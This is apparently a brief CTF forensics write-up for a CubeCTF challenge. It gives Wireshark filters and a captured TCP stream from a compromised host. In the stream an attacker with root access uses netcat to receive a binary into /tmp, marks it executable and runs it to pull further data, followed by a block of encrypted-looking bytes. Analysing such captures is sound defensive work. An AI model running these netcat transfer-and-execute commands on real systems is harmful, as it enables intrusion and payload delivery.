# Operation - CubeCTF

### TCP Stream

`ip.addr == 5.161.95.137 || ip.addr == 5.161.100.25`

```
id

uid=0(root) gid=0(root) groups=0(root)

nc -lvp 2025 > /tmp/xcat
chmod +x /tmp/xcat
/tmp/xcat -l 2025 > /tmp/supersecret
```



Note: 
`5.161.95.137 -> 5.161.100.25`

```
id
uid=0(root) gid=0(root) groups=0(root)
nc -lvp 2025 > /tmp/xcat
```


`5.161.95.137 -> 5.161.100.25`

```
Ln;V+��qP̈́�greb�e�')M'd0�c�hFm��Por'I�y�8PMs���aunV1�x�lJT{͙�pbdV1�B�oBLj̓�$erV1�n�lKGgʅ�$ixb�{�kFFEin#�+�}QG9���}'c2I�n�jFV>���kuz6�e�gru9

�;�GR-���4ud)7�T�mOV/���0`$)2]�g�,GQAՖ�0>$Ez�M'2�e�zLFg͑�jcdV6��6

(
```


assumption:
x.x.95.137 is the attacker
x.x.100.25 is the target

`ip.addr == 5.161.95.137 and ip.addr == 5.161.100.25 and !(dns or icmp or arp or tcp.analysis.flags or tcp.flags.reset == 1) and tcp.flags.push == 1 and tcp.flags.ack == 1`